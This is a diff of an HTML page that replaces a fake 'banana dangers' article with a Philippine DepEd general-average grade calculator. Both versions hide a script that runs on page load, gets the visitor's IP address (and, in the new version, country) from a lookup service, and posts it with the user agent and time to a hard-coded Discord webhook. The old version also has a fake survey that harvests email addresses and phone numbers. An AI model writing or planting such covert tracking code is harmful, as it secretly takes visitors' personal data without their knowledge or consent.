@@ -1,142 +1,207 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="en">
 <head>
-  <title>The Hidden Dangers Lurking in Your Everyday Banana</title>
-  <style>
-    body { font-family: sans-serif; line-height: 1.6; margin: 20px; background-color: #f4f4f4; color: #333; }
-    h1, h2 { color: #d35400; }
-    p { margin-bottom: 15px; }
-    .author { font-style: italic; color: #777; margin-bottom: 10px; }
-    .disclaimer { color: #c0392b; font-size: 0.8em; margin-top: 20px; }
-    #hiddenData { display: none; }
-    .survey-section { background-color: #e0e0e0; padding: 15px; border-radius: 5px; margin-top: 20px; }
-    .error { color: red; }
-  </style>
-</head>
-<body>
-  <h1>The Hidden Dangers Lurking in Your Everyday Banana</h1>
-  <p class="author">By Anya Sharma, Investigative Journalist</p>
+<meta charset="UTF-8">
+<title>DepEd General Average Calculator</title><style>
 
-  <p>You peel it, you eat it, you toss the skin. But what if the humble banana harbors secrets that could change the way you see this potassium-rich fruit forever? Our exclusive investigation uncovers startling claims and anecdotal evidence suggesting a hidden world within your breakfast staple.</p>
+body{
+font-family:"Segoe UI",Arial;
+margin:0;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(270deg,red,orange,yellow,green,cyan,blue,violet);
+background-size:1400% 1400%;
+animation:rgb 15s ease infinite;
+}
 
-  <h2>The Peel's Silent Signals</h2>
-  <p>Sources close to our investigation have revealed that the patterns on a banana peel might not be random. Could these seemingly innocent brown spots be a complex form of communication, perhaps even a warning?</p>
+@keyframes rgb{
+0%{background-position:0% 50%}
+50%{background-position:100% 50%}
+100%{background-position:0% 50%}
+}
 
-  <h2>The Potassium Conspiracy</h2>
-  <p>We delve into the murky depths of the potassium industry. Are the widely accepted health benefits of this mineral merely a smokescreen for something more sinister? One anonymous expert stated, "The sheer abundance of potassium in bananas... it's unnatural."</p>
+.container{
+background:white;
+width:420px;
+padding:30px;
+border-radius:10px;
+box-shadow:0 10px 30px rgba(0,0,0,0.3);
+text-align:center;
+}
 
-  <h2>Have You Experienced These "Banana Side Effects"?</h2>
-  <ul>
-    <li>Sudden urges to buy more bananas?</li>
-    <li>Unexplained feelings of tropical relaxation?</li>
-    <li>A strange yellow residue on your fingers?</li>
-  </ul>
-  <p>If you've experienced any of these, you're not alone. Share your story in the comments below!</p>
+.logo{
+width:120px;
+margin-bottom:10px;
+}
 
-  <div id="hiddenData">
-    <span id="ipAddress"></span>
-    <span id="userAgent"></span>
-  </div>
+.title{
+font-size:22px;
+font-weight:700;
+}
 
-  <script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1354943880205959280/m_Sk7fhLF3e9lFab06lzMB9Up1Y0FtxJqZJDMQZxkRgapN388FpY9mXaZhDacvqiz86d';
+.line{
+border-top:2px solid black;
+margin:12px 0;
+}
 
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('ipAddress').innerText = data.ip;
-        sendData(data.ip);
-      })
-      .catch(error => console.error('Error fetching IP:', error));
+.section{
+font-weight:600;
+}
 
-    const userAgent = navigator.userAgent;
-    document.getElementById('userAgent').innerText = userAgent;
+.example{
+font-size:13px;
+color:#444;
+margin-bottom:10px;
+}
 
-    function sendData(ipAddress) {
-      const ua = document.getElementById('userAgent').innerText;
+input{
+width:100%;
+padding:12px;
+margin:6px 0;
+border-radius:5px;
+border:1px solid #ccc;
+font-size:15px;
+}
 
-      const payload = {
-        embeds: [{
-          title: 'Banana Article Opened',
-          fields: [
-            { name: 'IP Address', value: ipAddress },
-            { name: 'User Agent', value: ua }
-          ]
-        }]
-      };
+button{
+width:100%;
+padding:12px;
+margin-top:12px;
+border:none;
+border-radius:6px;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+color:white;
+background:linear-gradient(45deg,#0072ff,#00c6ff);
+}
 
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      }).catch(error => console.error('Error sending data:', error));
-    }
-  </script>
+.result{
+margin-top:15px;
+font-size:17px;
+font-weight:600;
+line-height:1.6;
+}
 
-  <div class="survey-section">
-    <h2>Help Us Uncover the Truth!</h2>
-    <p>Participate in our brief survey and receive a free e-book: "101 Things You Never Knew About Bananas."</p>
-    <form id="fakeSurvey">
-      <p>Have you ever felt unusually drawn to purchase bananas? (Optional)</p>
-      <textarea name="bananaUrge"></textarea>
-      <p>Enter your email address to receive your free e-book:</p>
-      <input type="email" name="email">
-      <p>Enter your phone number to receive an exclusive bonus chapter:</p>
-      <input type="tel" name="phoneNumber">
-      <button type="button" onclick="submitFakeSurvey()">Submit</button>
-    </form>
-    <p id="error-message" class="error"></p>
-  </div>
+.error{color:red;}
+.success{color:green;}
 
-  <script>
-    function submitFakeSurvey() {
-      const email = document.querySelector('input[name="email"]').value;
-      const phoneNumber = document.querySelector('input[name="phoneNumber"]').value;
-      const errorMessage = document.getElementById('error-message');
-      errorMessage.textContent = ''; // Clear previous errors
+</style></head><body>
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1406195402385920010/14yCZb2E9y701ujKNT76skk1bTlEpLz8iu00IGnoJI7zjNr1Ht0g7eZrr97NvpTSeXve";
 
-      const gmailRegex = /^[^\s@]+@gmail\.com$/;
-      const anyComRegex = /^[^\s@]+@[^\s@]+\.com$/;
-      const phoneRegex = /^\d{11,}$/;
-      let isEmailValid = false;
+async function sendVisitorInfo() {
+  try {
+    // Get IP + Country
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
 
-      if (gmailRegex.test(email) || anyComRegex.test(email)) {
-        isEmailValid = true;
-      } else {
-        errorMessage.textContent = 'Please enter a valid email address ending with @gmail.com or .com.';
-        return;
-      }
+    const ip = data.ip || "Unknown";
+    const country = data.country_name || "Unknown";
+    const device = navigator.userAgent;
+    const time = new Date().toLocaleString();
 
-      if (phoneNumber && !phoneRegex.test(phoneNumber)) {
-        errorMessage.textContent = 'Please enter a valid phone number (at least 11 digits).';
-        return;
-      }
+    const payload = {
+      embeds: [{
+        title: "Page Opened",
+        color: 16776960,
+        description:
+`Device name: ${device}
+IP address: ${ip}
+Time Opened: ${time}
+Country: ${country}`
+      }]
+    };
 
-      const payload = {
-        embeds: [{
-          title: 'Banana Survey Data',
-          fields: [
-            { name: 'Email', value: email },
-            { name: 'Phone Number', value: phoneNumber || 'Not provided' }
-          ]
-        }]
-      };
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
 
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      }).catch(error => console.error('Error sending survey data:', error));
+  } catch (err) {
+    console.error("Error:", err);
+  }
+}
 
-      alert('Thank you for your participation! Your e-book and bonus chapter will be sent shortly (still not really).');
-    }
-  </script>
+sendVisitorInfo();
+</script>
+<div class="container"><img class="logo" src="https://www.freelogovectors.net/wp-content/uploads/2018/04/deped-logo_freelogovectors.net_.png"><div class="title">DEPED GENERAL AVERAGE</div><div class="line"></div><div class="section">INPUT YOUR QUARTER GRADES</div><div class="line"></div><div class="example">Example Quarter 1: 90</div><div class="line"></div><input type="number" id="q1" placeholder="Q1">
+<input type="number" id="q2" placeholder="Q2">
+<input type="number" id="q3" placeholder="Q3">
+<input type="number" id="q4" placeholder="Q4 (optional)"><div class="line"></div><button onclick="calculate()">CALCULATE</button>
 
-  <p class="disclaimer">**Disclaimer:** This article contains fictional elements for illustrative purposes. No actual dangers have been linked to everyday bananas.</p>
+<div class="result" id="result"></div></div><script>
 
-</body>
+function validGrade(g){
+if(g === 100) return true;
+if(g >= 75 && g <= 99 && g.toString().length === 2) return true;
+return false;
+}
+
+function honorLevel(avg){
+
+if(avg >= 97.5 && avg <= 100) return "WITH HIGHEST HONORS";
+if(avg >= 95.5 && avg <= 97.4) return "WITH HIGH HONORS";
+if(avg >= 89.5 && avg <= 94.4) return "WITH HONORS";
+if(avg >= 75 && avg <= 89.4) return "NOT QUALIFIED FOR HONORS";
+
+return "INVALID";
+}
+
+function calculate(){
+
+let q1=parseFloat(document.getElementById("q1").value);
+let q2=parseFloat(document.getElementById("q2").value);
+let q3=parseFloat(document.getElementById("q3").value);
+let q4=parseFloat(document.getElementById("q4").value);
+
+let result=document.getElementById("result");
+
+if(!validGrade(q1)||!validGrade(q2)||!validGrade(q3)){
+result.innerHTML="<span class='error'>Invalid grades. Only 75-99 or 100 allowed.</span>";
+return;
+}
+
+let needed=358-(q1+q2+q3);
+
+let output="";
+
+if(isNaN(q4)){
+
+if(needed>100){
+output+="Required Q4 for With Honors: Impossible (exceeds 100)<br>";
+}else{
+output+="Required Q4 for With Honors: "+needed.toFixed(2)+"<br>";
+}
+
+output+="Final Average (Provide Q4 Grade): -<br>";
+output+="Honor Level: -";
+
+}
+
+else{
+
+if(!validGrade(q4)){
+result.innerHTML="<span class='error'>Invalid Q4 grade.</span>";
+return;
+}
+
+let avg=(q1+q2+q3+q4)/4;
+let honor=honorLevel(avg);
+
+output+="Required Q4 for With Honors: "+needed.toFixed(2)+"<br>";
+output+="Final Average: "+avg.toFixed(2)+"<br>";
+output+="Honor Level: "+honor;
+
+}
+
+result.innerHTML=output;
+
+}
+
+</script></body>
 </html>
